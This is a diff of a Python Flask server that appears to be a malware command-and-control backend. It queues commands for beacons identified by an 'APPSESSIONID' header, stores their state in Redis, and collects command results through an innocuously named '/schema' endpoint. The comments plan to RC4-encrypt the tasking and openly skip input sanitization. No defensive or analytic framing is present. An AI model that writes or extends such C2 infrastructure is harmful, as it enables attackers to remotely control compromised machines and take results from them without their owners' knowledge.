@@ -62,7 +62,7 @@ def session():
             Res = comm["Result"]
             # Set the command to 0
             structure = {
-                "NewC": "0",
+                "Retrieved": "0",  # Reset retrieved so we know the command was picked up
                 "Command": "0",
                 "LastInteraction": f"{LastInteraction}",
                 "LastCheckIn": f"{datetime.today().strftime('%Y-%m-%d %H:%M:%S')}",
@@ -71,15 +71,24 @@ def session():
             structure = json.dumps(structure)  # Dump the json
             # Write the message value to the beacon:UUID key
             conn.hset('UUID', uuid, structure)
-            return Command
+            return Command  # we've really got to RC4 encrypt this
 
 
 @app.route("/schema", methods=['GET'])
 def schema():
     # This function handles beacons returning data
     # Grab the appsessionid value from the headers
+    # CURRENT ISSUE
+    # IT'S SENDING TO SCHEMA
+    # BUT SCHEMA CAN'T HANDLE CREATING NEW UUIDS
     uuid = request.headers['APPSESSIONID']
     result = request.headers['Res']
+    command = conn.hget('UUID', uuid)  # Get the struct
+    command = command.decode()  # Decode it from bytes
+    command = json.loads(command)  # it's returned as string so convert it to dict
+    structure = json.dumps(command)  # Dump the dict to json
+    comm = json.loads(structure)  # Load it into a new var
+    LastInteraction = comm["LastInteraction"]
     print(request.headers)
     if set(uuid).difference(string.ascii_letters + string.digits):
         # We're not going to bother with input sanitization here
@@ -88,8 +97,9 @@ def schema():
     else:
         # Let's convert the command struct to a JSON object
         structure = {
+            "Retrieved": "1",  # Set retrieved to 1 so we know we got results
             "Command": "0",
-            "LastInteraction": "0",
+            "LastInteraction": f"{LastInteraction}",
             "LastCheckIn": f"{datetime.today().strftime('%Y-%m-%d %H:%M:%S')}",
             "Result": f"{result}"
         }
